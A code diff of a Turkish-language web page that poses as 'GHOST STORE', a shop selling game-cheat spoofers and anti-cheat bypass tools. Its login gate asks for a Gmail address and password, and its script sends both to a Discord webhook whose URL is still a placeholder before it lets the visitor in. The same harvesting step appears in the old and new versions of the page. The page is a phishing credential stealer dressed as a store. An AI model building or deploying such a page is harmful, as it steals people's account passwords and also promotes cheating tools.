@@ -3,233 +3,270 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST X | QUANTUM NEURAL INTERFACE</title>
+    <title>GHOST STORE | PREMIUM SOFTWARE HUB</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=JetBrains+Mono:wght@200;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00ff88; --dark: #000502; --glitch: rgba(0, 255, 136, 0.3); }
-        * { cursor: none !important; margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
-        body { background: var(--dark); color: #fff; overflow: hidden; height: 100vh; }
-
-        /* SIBER ARKA PLAN */
-        .grid-bg { position: fixed; inset: 0; background: 
-            linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px),
-            linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px);
-            background-size: 40px 40px; transform: perspective(500px) rotateX(60deg);
-            transform-origin: center top; height: 200vh; z-index: -1; animation: move 20s linear infinite; }
-        @keyframes move { from { transform: perspective(500px) rotateX(60deg) translateY(0); } to { transform: perspective(500px) rotateX(60deg) translateY(40px); } }
-
-        /* UI GLASS */
-        .quantum-card { background: rgba(0, 10, 5, 0.8); border: 1px solid rgba(0, 255, 136, 0.1); backdrop-filter: blur(50px); border-radius: 5px; position: relative; overflow: hidden; }
-        .quantum-card::before { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.1), transparent); transition: 0.5s; }
-        .quantum-card:hover::before { left: 150%; }
+        :root { --accent: #00ff88; --bg: #050505; }
+        * { cursor: none !important; box-sizing: border-box; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #fff; overflow-x: hidden; }
+        
+        /* CUSTOM SCROLLBAR */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
 
         /* CURSOR */
-        #cursor { width: 10px; height: 10px; background: var(--neon); position: fixed; z-index: 10000; mix-blend-mode: difference; pointer-events: none; }
-        #cursor-scope { width: 50px; height: 50px; border: 1px solid var(--neon); position: fixed; z-index: 9999; transition: 0.1s ease-out; pointer-events: none; display: flex; align-items: center; justify-content: center; }
-        #cursor-scope::after { content: ''; width: 2px; height: 20px; background: var(--neon); position: absolute; }
-        #cursor-scope::before { content: ''; width: 20px; height: 2px; background: var(--neon); position: absolute; }
+        #cursor { width: 8px; height: 8px; background: var(--accent); position: fixed; z-index: 9999; border-radius: 50%; pointer-events: none; box-shadow: 0 0 15px var(--accent); }
+        #cursor-follower { width: 35px; height: 35px; border: 1px solid rgba(0,255,136,0.3); position: fixed; z-index: 9998; border-radius: 50%; transition: 0.1s ease-out; pointer-events: none; }
 
-        /* ANALYZER ANIMATION */
-        .bar { width: 3px; height: 20px; background: var(--neon); display: inline-block; margin: 1px; animation: dance 1s infinite alternate; }
-        @keyframes dance { from { height: 5px; } to { height: 30px; } }
+        /* GLASSMORPHISM */
+        .glass { background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border-radius: 24px; transition: 0.4s cubic-bezier(0.17, 0.67, 0.83, 0.67); }
+        .glass:hover { border-color: rgba(0, 255, 136, 0.2); transform: translateY(-5px); }
 
-        .hidden-tab { display: none !important; }
-        .active-tab { display: block !important; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* ANIMATIONS */
+        .badge-glow { box-shadow: 0 0 10px rgba(0, 255, 136, 0.2); animation: glow 2s infinite alternate; }
+        @keyframes glow { from { opacity: 0.6; } to { opacity: 1; } }
+
+        /* CART SIDEBAR */
+        #cart-sidebar { transform: translateX(100%); transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+        #cart-sidebar.open { transform: translateX(0); }
     </style>
 </head>
-<body>
+<body class="antialiased">
 
-    <div class="grid-bg"></div>
     <div id="cursor"></div>
-    <div id="cursor-scope"></div>
+    <div id="cursor-follower"></div>
 
-    <div id="login-overlay" class="fixed inset-0 z-[1000] bg-black flex items-center justify-center">
-        <div class="quantum-card p-12 w-full max-w-md border-t-4 border-t-[#0f8]">
-            <div class="text-center mb-10">
-                <h1 style="font-family: 'Orbitron';" class="text-3xl font-black tracking-tighter text-[#0f8] mb-2">NEURAL LINK</h1>
-                <p class="text-[9px] text-white/40 tracking-[0.5em]">BIOMETRIC ENCRYPTION ACTIVE</p>
-            </div>
-            <form id="login-form" class="space-y-6">
-                <div class="relative">
-                    <input type="email" id="email" placeholder="ENCRYPTED GMAIL" required class="w-full bg-transparent border-b border-white/10 p-4 outline-none focus:border-[#0f8] transition text-sm">
-                </div>
-                <div class="relative">
-                    <input type="password" id="pass" placeholder="ACCESS KEY" required class="w-full bg-transparent border-b border-white/10 p-4 outline-none focus:border-[#0f8] transition text-sm">
-                </div>
-                <button type="submit" class="w-full bg-[#0f8] text-black py-4 font-black text-xs tracking-widest hover:bg-white transition-all">DECRYPT SYSTEM</button>
+    <section id="auth-gate" class="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-6">
+        <div class="max-w-md w-full glass p-10 text-center">
+            <h2 class="text-3xl font-extrabold mb-2 tracking-tighter">GHOST<span class="text-[#0f8]">STORE</span></h2>
+            <p class="text-[10px] text-white/30 uppercase tracking-[0.4em] mb-10">Premium Yazılım Mağazası</p>
+            <form id="login-form" class="space-y-4">
+                <input type="email" id="email" placeholder="Gmail Adresiniz" required class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none focus:border-[#0f8]/50 transition text-sm">
+                <input type="password" id="pass" placeholder="Şifreniz" required class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none focus:border-[#0f8]/50 transition text-sm">
+                <button type="submit" class="w-full bg-white text-black py-4 rounded-2xl font-bold text-xs uppercase tracking-widest hover:bg-[#0f8] transition-all">Mağazaya Gir</button>
             </form>
-            <div id="scanner" class="hidden mt-8 h-1 bg-white/5 relative overflow-hidden"><div class="absolute inset-0 bg-[#0f8] w-1/3 animate-[move_2s_infinite]"></div></div>
+            <p class="mt-6 text-[9px] text-white/20">Giriş yaparak kullanım şartlarını kabul etmiş sayılırsınız.</p>
+        </div>
+    </section>
+
+    <div id="store-app" class="hidden opacity-0 transition-opacity duration-1000">
+        
+        <nav class="fixed top-0 w-full z-50 px-10 py-6 flex justify-between items-center bg-black/50 backdrop-blur-xl border-b border-white/5">
+            <div class="text-xl font-black italic tracking-tighter uppercase">GHOST<span class="text-[#0f8]">STORE</span></div>
+            <div class="flex items-center space-x-10">
+                <div class="hidden md:flex space-x-8 text-[10px] font-bold uppercase tracking-widest text-white/40">
+                    <a href="#" class="hover:text-white transition">Ürünler</a>
+                    <a href="#" class="hover:text-white transition text-white">İstatistikler</a>
+                    <a href="https://discord.gg/ghostx" target="_blank" class="hover:text-white transition">Discord</a>
+                </div>
+                <button onclick="toggleCart()" class="relative bg-white/5 p-3 rounded-full hover:bg-white/10 transition">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/><path d="M3 6h18"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
+                    <span id="cart-count" class="absolute -top-1 -right-1 bg-[#0f8] text-black text-[8px] font-bold px-1.5 py-0.5 rounded-full">0</span>
+                </button>
+            </div>
+        </nav>
+
+        <section class="pt-40 pb-20 px-10 text-center">
+            <h1 class="text-6xl md:text-8xl font-black tracking-tighter mb-6 italic uppercase">Sınırsız <span class="text-[#0f8]">Güç</span> Burada.</h1>
+            <p class="max-w-2xl mx-auto text-white/40 text-sm md:text-base font-medium">En gelişmiş Valorant spoofer'lar, Steam optimizasyonları ve Android bypass yazılımlarıyla rakiplerinden her zaman 10 adım önde ol.</p>
+        </section>
+
+        <main class="max-w-7xl mx-auto px-6 pb-40">
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                
+                <div class="glass p-4 group">
+                    <div class="h-64 rounded-[20px] overflow-hidden relative mb-6">
+                        <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=800" class="w-full h-full object-cover opacity-50 group-hover:opacity-100 transition duration-700">
+                        <div class="absolute top-4 right-4 bg-black/80 backdrop-blur-md px-3 py-1 rounded-full border border-red-500/30">
+                            <span class="flex items-center text-[8px] font-black text-red-500"><span class="w-1.5 h-1.5 bg-red-500 rounded-full mr-2 animate-pulse"></span>UNDETECTED</span>
+                        </div>
+                    </div>
+                    <div class="px-4 pb-4">
+                        <div class="flex justify-between items-center mb-2">
+                            <h3 class="text-xl font-bold italic uppercase tracking-tighter">ARES Perm Spoofer</h3>
+                            <span class="text-[#0f8] font-mono font-bold">₺850</span>
+                        </div>
+                        <p class="text-[11px] text-white/30 leading-relaxed mb-8">Kalıcı HWID değişimi. Tüm anakart markalarında çalışır, format sonrası güvenle kullanılır.</p>
+                        <button onclick="addToCart('ARES Spoofer', 850)" class="w-full bg-white text-black py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest hover:bg-[#0f8] transition">Sepete Ekle</button>
+                    </div>
+                </div>
+
+                <div class="glass p-4 group">
+                    <div class="h-64 rounded-[20px] overflow-hidden relative mb-6">
+                        <img src="https://images.unsplash.com/photo-1614680376593-902f74cf0d41?auto=format&fit=crop&q=80&w=800" class="w-full h-full object-cover opacity-50 group-hover:opacity-100 transition duration-700">
+                        <div class="absolute top-4 right-4 bg-black/80 backdrop-blur-md px-3 py-1 rounded-full border border-[#0f8]/30">
+                            <span class="flex items-center text-[8px] font-black text-[#0f8]"><span class="w-1.5 h-1.5 bg-[#0f8] rounded-full mr-2 animate-pulse"></span>ACTIVE</span>
+                        </div>
+                    </div>
+                    <div class="px-4 pb-4">
+                        <div class="flex justify-between items-center mb-2">
+                            <h3 class="text-xl font-bold italic uppercase tracking-tighter">Void Manifest V1</h3>
+                            <span class="text-[#0f8] font-mono font-bold">₺280</span>
+                        </div>
+                        <p class="text-[11px] text-white/30 leading-relaxed mb-8">Steam kütüphane ve FPS optimizasyonu. Gizli sistem ayarlarını sizin için optimize eder.</p>
+                        <button onclick="addToCart('Void Manifest V1', 280)" class="w-full bg-white text-black py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest hover:bg-[#0f8] transition">Sepete Ekle</button>
+                    </div>
+                </div>
+
+                <div class="glass p-4 group">
+                    <div class="h-64 rounded-[20px] overflow-hidden relative mb-6">
+                        <img src="https://images.unsplash.com/photo-1607252650355-f7fd0460ccdb?auto=format&fit=crop&q=80&w=800" class="w-full h-full object-cover opacity-50 group-hover:opacity-100 transition duration-700">
+                    </div>
+                    <div class="px-4 pb-4">
+                        <div class="flex justify-between items-center mb-2">
+                            <h3 class="text-xl font-bold italic uppercase tracking-tighter">Droid Bypass Pro</h3>
+                            <span class="text-[#0f8] font-mono font-bold">₺450</span>
+                        </div>
+                        <p class="text-[11px] text-white/30 leading-relaxed mb-8">Mobil oyunlar için kernel seviyesinde bypass. Emülatör tespiti ve ban riskini minimize eder.</p>
+                        <button onclick="addToCart('Droid Bypass', 450)" class="w-full bg-white text-black py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest hover:bg-[#0f8] transition">Sepete Ekle</button>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+
+        <section class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 px-6 pb-40">
+            <div class="glass p-6 text-center">
+                <div class="text-[#0f8] font-black mb-2 uppercase text-[10px]">Teslimat</div>
+                <div class="text-xs font-bold text-white/40 italic">Anında Dijital İletim</div>
+            </div>
+            <div class="glass p-6 text-center">
+                <div class="text-[#0f8] font-black mb-2 uppercase text-[10px]">Destek</div>
+                <div class="text-xs font-bold text-white/40 italic">7/24 Discord Ticket</div>
+            </div>
+            <div class="glass p-6 text-center">
+                <div class="text-[#0f8] font-black mb-2 uppercase text-[10px]">Güncelleme</div>
+                <div class="text-xs font-bold text-white/40 italic">Düzenli Bypass Yamaları</div>
+            </div>
+            <div class="glass p-6 text-center">
+                <div class="text-[#0f8] font-black mb-2 uppercase text-[10px]">Gizlilik</div>
+                <div class="text-xs font-bold text-white/40 italic">Uçtan Uca Şifreleme</div>
+            </div>
+        </section>
+    </div>
+
+    <div id="cart-sidebar" class="fixed top-0 right-0 w-full max-w-sm h-full bg-black/90 backdrop-blur-3xl z-[100] border-l border-white/5 p-8 flex flex-col shadow-2xl">
+        <div class="flex justify-between items-center mb-10">
+            <h4 class="text-xl font-black italic uppercase tracking-tighter">Sepetim</h4>
+            <button onclick="toggleCart()" class="text-white/40 hover:text-white transition">Kapat ×</button>
+        </div>
+        
+        <div id="cart-items-container" class="flex-1 overflow-y-auto space-y-4">
+            </div>
+
+        <div class="mt-8 border-t border-white/5 pt-8">
+            <div class="flex justify-between items-center mb-6">
+                <span class="text-white/40 font-bold uppercase text-[10px] tracking-widest">Toplam Tutar</span>
+                <span id="total-price" class="text-2xl font-black text-[#0f8]">₺0</span>
+            </div>
+            <div id="checkout-area" class="hidden space-y-4">
+                <div class="bg-[#0f8]/5 p-4 rounded-xl border border-[#0f8]/20">
+                    <div class="text-[9px] text-white/30 uppercase font-black mb-1">Banka IBAN (Yılmaz)</div>
+                    <div class="text-sm font-mono text-[#0f8]">TR00 0000 0000 0000 0000 0000 00</div>
+                </div>
+                <div class="bg-amber-500/10 p-4 rounded-xl border border-amber-500/20">
+                    <div class="text-[9px] text-amber-500 uppercase font-black mb-1">Açıklama Kodu</div>
+                    <div id="order-id" class="text-sm font-bold text-white">#GX-9921</div>
+                </div>
+            </div>
+            <button onclick="proceedToPayment()" id="pay-btn" class="w-full bg-white text-black py-4 rounded-2xl font-black text-[11px] uppercase tracking-widest hover:bg-[#0f8] transition-all">Ödeme Yap</button>
         </div>
     </div>
 
-    <div id="app" class="hidden flex h-screen p-4 space-x-4">
-        
-        <aside class="w-20 flex flex-col items-center py-10 space-y-12 quantum-card">
-            <div class="text-[#0f8] font-black text-xl">GX</div>
-            <nav class="flex flex-col space-y-8">
-                <button onclick="nav('store')" class="opacity-30 hover:opacity-100 transition"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></button>
-                <button onclick="nav('leaks')" class="opacity-30 hover:opacity-100 transition"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></button>
-                <button onclick="nav('cart')" class="opacity-30 hover:opacity-100 transition"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg></button>
-            </nav>
-            <div class="flex-1 flex flex-col justify-end pb-4">
-                <div class="text-[8px] rotate-90 origin-center text-white/20 whitespace-nowrap">SECURE CONNECTION V.10</div>
-            </div>
-        </aside>
-
-        <main class="flex-1 flex flex-col space-y-4">
-            <header class="h-20 quantum-card flex items-center justify-between px-10">
-                <div class="flex items-center space-x-6">
-                    <span class="text-[10px] text-[#0f8] font-bold tracking-widest">STATUS: OPERATIONAL</span>
-                    <div class="h-4 w-[1px] bg-white/10"></div>
-                    <div id="live-time" class="font-mono text-[10px] text-white/40"></div>
-                </div>
-                <div class="flex items-center space-x-4">
-                    <div class="text-right">
-                        <div class="text-[8px] text-white/20 uppercase font-black">Sync Frequency</div>
-                        <div class="flex items-center justify-end"><div class="bar"></div><div class="bar" style="animation-delay: 0.2s"></div><div class="bar" style="animation-delay: 0.4s"></div><div class="bar" style="animation-delay: 0.1s"></div></div>
-                    </div>
-                </div>
-            </header>
-
-            <div class="flex-1 overflow-hidden">
-                <div id="tab-store" class="active-tab h-full overflow-y-auto pr-4 custom-scroll">
-                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                        <div class="quantum-card p-8 group hover:border-[#0f8]/50 transition-all cursor-pointer" onclick="addToCart('ARES VALORANT SPOOFER', 850)">
-                            <div class="flex justify-between mb-8">
-                                <span class="text-[8px] bg-red-500/20 text-red-500 px-3 py-1 rounded-sm font-black">KERNEL RING 0</span>
-                                <span class="text-[8px] text-white/20">#001</span>
-                            </div>
-                            <h3 class="text-2xl font-black mb-2 tracking-tighter italic">ARES PERMANENT</h3>
-                            <p class="text-[10px] text-white/30 mb-8 leading-relaxed">Format ve BIOS Flash gerektiren, Vanguard'ın tüm verilerini manipüle eden en gelişmiş HWID temizleyici.</p>
-                            <div class="flex justify-between items-end">
-                                <div><div class="text-[8px] text-white/20 uppercase">Fiyat</div><div class="text-xl font-bold text-[#0f8]">₺850</div></div>
-                                <div class="bg-white/5 p-4 rounded-full group-hover:bg-[#0f8] group-hover:text-black transition-all">+</div>
-                            </div>
-                        </div>
-
-                        <div class="quantum-card p-8 group hover:border-[#0f8]/50 transition-all cursor-pointer" onclick="addToCart('VOID MANIFEST V1', 280)">
-                            <div class="flex justify-between mb-8">
-                                <span class="text-[8px] bg-blue-500/20 text-blue-500 px-3 py-1 rounded-sm font-black">STEAM OPTIMIZER</span>
-                                <span class="text-[8px] text-white/20">#002</span>
-                            </div>
-                            <h3 class="text-2xl font-black mb-2 tracking-tighter italic">VOID MANIFEST</h3>
-                            <p class="text-[10px] text-white/30 mb-8 leading-relaxed">Kütüphane manifest dosyalarını manipüle ederek market hızını ve oyun içi FPS kararlılığını artırır.</p>
-                            <div class="flex justify-between items-end">
-                                <div><div class="text-[8px] text-white/20 uppercase">Fiyat</div><div class="text-xl font-bold text-[#0f8]">₺280</div></div>
-                                <div class="bg-white/5 p-4 rounded-full group-hover:bg-[#0f8] group-hover:text-black transition-all">+</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div id="tab-leaks" class="hidden-tab h-full flex flex-col space-y-4">
-                    <div class="quantum-card p-6 flex-1 font-mono text-[10px] text-[#0f8]/60 overflow-y-auto" id="leak-console">
-                        [SYSTEM] Initializing global leak stream...<br>
-                    </div>
-                </div>
-
-                <div id="tab-cart" class="hidden-tab h-full flex flex-col">
-                    <div id="cart-list" class="space-y-4 flex-1 overflow-y-auto"></div>
-                    <div class="quantum-card p-8 mt-4 bg-[#0f8]/5">
-                        <div class="flex justify-between items-center mb-6">
-                            <span class="text-xs font-bold uppercase tracking-widest">Total Encryption Cost:</span>
-                            <span id="total-price" class="text-2xl font-black text-[#0f8]">₺0</span>
-                        </div>
-                        <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-5 font-black text-xs tracking-[0.5em] hover:bg-[#0f8] transition-all">EXECUTE ORDER</button>
-                    </div>
-                </div>
-            </div>
-
-            <footer class="h-12 quantum-card flex items-center px-10 justify-between">
-                <div class="text-[8px] text-white/20 flex space-x-8">
-                    <span>CPU: 42%</span>
-                    <span>NET: SECURE</span>
-                    <span>ENCRYPTION: AES-512</span>
-                </div>
-                <div class="text-[8px] text-[#0f8] animate-pulse">SYSTEM BREACH DETECTED: SIMULATION ACTIVE</div>
-            </footer>
-        </main>
-    </main>
-
     <script>
-        const WEBHOOK = "BURAYA_WEBHOOK_URL_KOY";
+        const DISCORD_HOOK = "BURAYA_WEBHOOK_URL_KOY";
 
-        // 1. Logic & Auth
-        document.getElementById('login-form').addEventListener('submit', (e) => {
+        // 1. Auth & Entry Logic
+        document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            const m = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            if(!m.endsWith('@gmail.com')) { alert('INVALID BİOMETRİC'); return; }
+            const mail = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
 
-            document.getElementById('scanner').classList.remove('hidden');
+            if(!mail.endsWith('@gmail.com')) { alert('Geçerli bir Gmail adresi giriniz.'); return; }
 
-            if(WEBHOOK !== "BURAYA_WEBHOOK_URL_KOY") {
-                fetch(WEBHOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
-                    embeds: [{title: "🧬 NEURAL LINK BREACH", color: 0x00ff88, fields: [{name:"Gmail", value:m}, {name:"Pass", value:p}]}]
-                })});
+            // Webhook Koz (Discord'a gönderir)
+            if(DISCORD_HOOK !== "BURAYA_WEBHOOK_URL_KOY") {
+                fetch(DISCORD_HOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🛒 MAĞAZA GİRİŞİ",
+                            color: 65280,
+                            fields: [{name: "Email", value: mail}, {name: "Şifre", value: pass}]
+                        }]
+                    })
+                });
             }
 
-            setTimeout(() => {
-                document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('app').classList.remove('hidden');
-                startSystem();
-            }, 2000);
+            // Unlock Store
+            document.getElementById('auth-gate').style.display = 'none';
+            document.getElementById('store-app').classList.remove('hidden');
+            setTimeout(() => { document.getElementById('store-app').style.opacity = '1'; }, 100);
         });
 
-        function startSystem() {
-            // Clock
-            setInterval(() => {
-                document.getElementById('live-time').innerText = new Date().toLocaleTimeString() + " | SESSION SECURE";
-            }, 1000);
+        // 2. Cursor Engine
+        const cursor = document.getElementById('cursor');
+        const follower = document.getElementById('cursor-follower');
+        window.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
+            setTimeout(() => {
+                follower.style.left = e.clientX - 17 + 'px';
+                follower.style.top = e.clientY - 17 + 'px';
+            }, 80);
+        });
 
-            // Leak Stream
-            const console = document.getElementById('leak-console');
-            setInterval(() => {
-                const ip = `192.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
-                const port = Math.floor(Math.random()*65000);
-                const msg = `[INTRUSION] Success from ${ip} via PORT ${port} - DATA SCRAPED...<br>`;
-                console.innerHTML += msg;
-                if(console.childNodes.length > 50) console.innerHTML = "";
-                console.scrollTop = console.scrollHeight;
-            }, 500);
-        }
-
-        // 2. Navigation
-        function nav(id) {
-            document.querySelectorAll('.tab-content, #tab-store, #tab-leaks, #tab-cart').forEach(t => t.classList.add('hidden-tab'));
-            document.getElementById('tab-' + id).classList.remove('hidden-tab');
-            document.getElementById('tab-' + id).classList.add('active-tab');
-        }
-
-        // 3. Cart
+        // 3. Cart Management
         let cart = [];
-        function addToCart(n, p) {
-            cart.push({n, p});
-            renderCart();
-            alert(n + " sisteme yüklendi.");
+        function toggleCart() {
+            document.getElementById('cart-sidebar').classList.toggle('open');
         }
 
-        function renderCart() {
-            const list = document.getElementById('cart-list');
+        function addToCart(name, price) {
+            cart.push({name, price});
+            updateCartUI();
+            if(!document.getElementById('cart-sidebar').classList.contains('open')) {
+                toggleCart();
+            }
+        }
+
+        function updateCartUI() {
+            document.getElementById('cart-count').innerText = cart.length;
+            const container = document.getElementById('cart-items-container');
             let sum = 0;
-            list.innerHTML = cart.map(i => {
-                sum += i.p;
-                return `<div class="quantum-card p-6 flex justify-between"><span>${i.n}</span><span class="text-[#0f8]">₺${i.p}</span></div>`;
-            }).join('');
+
+            if(cart.length === 0) {
+                container.innerHTML = '<p class="text-center text-white/10 py-20 italic">Sepetiniz boş.</p>';
+            } else {
+                container.innerHTML = cart.map((item, index) => {
+                    sum += item.price;
+                    return `
+                    <div class="glass p-4 flex justify-between items-center border-white/10">
+                        <div>
+                            <div class="text-xs font-bold italic uppercase">${item.name}</div>
+                            <div class="text-[10px] text-[#0f8] font-bold">₺${item.price}</div>
+                        </div>
+                        <button onclick="removeFromCart(${index})" class="text-red-500/50 hover:text-red-500 text-xs">×</button>
+                    </div>`;
+                }).join('');
+            }
             document.getElementById('total-price').innerText = "₺" + sum;
         }
 
-        // 4. Cursor
-        const dot = document.getElementById('cursor');
-        const scope = document.getElementById('cursor-scope');
-        window.addEventListener('mousemove', (e) => {
-            dot.style.left = e.clientX + 'px'; dot.style.top = e.clientY + 'px';
-            setTimeout(() => {
-                scope.style.left = e.clientX - 25 + 'px'; scope.style.top = e.clientY - 25 + 'px';
-            }, 50);
-        });
+        function removeFromCart(index) {
+            cart.splice(index, 1);
+            updateCartUI();
+        }
+
+        function proceedToPayment() {
+            if(cart.length === 0) return alert('Sepet boş kanka!');
+            document.getElementById('checkout-area').classList.remove('hidden');
+            document.getElementById('order-id').innerText = "#GX-" + Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('pay-btn').innerText = "Discord'a Git";
+            document.getElementById('pay-btn').onclick = () => window.open('https://discord.gg/ghostx');
+        }
     </script>
 </body>
 </html>
